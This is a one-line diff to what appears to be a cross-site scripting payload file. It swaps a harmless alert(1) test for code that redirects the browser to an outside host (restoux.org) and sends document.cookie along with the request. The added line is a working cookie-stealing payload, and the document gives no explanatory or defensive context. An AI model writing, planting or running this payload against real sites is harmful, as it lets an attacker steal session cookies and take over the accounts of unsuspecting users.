@@ -1,1 +1,1 @@
-alert(1);
+document.location="https://www.restoux.org/foo?c="+document.cookie;
